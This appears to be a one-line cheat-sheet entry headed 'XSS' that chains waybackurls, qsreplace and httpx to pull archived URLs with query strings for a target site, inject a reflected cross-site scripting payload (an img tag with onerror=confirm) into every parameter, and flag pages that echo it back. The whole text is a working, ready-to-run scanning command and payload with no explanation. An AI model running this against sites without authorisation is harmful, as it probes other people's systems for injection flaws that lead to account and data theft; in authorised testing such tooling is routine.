==================XSS========================
echo "site.com"|waybackurls|grep "?"|qsreplace 'xssz"><img/src=x onerror=confirm(999)><!---'|httpx -mr '\"><img/'
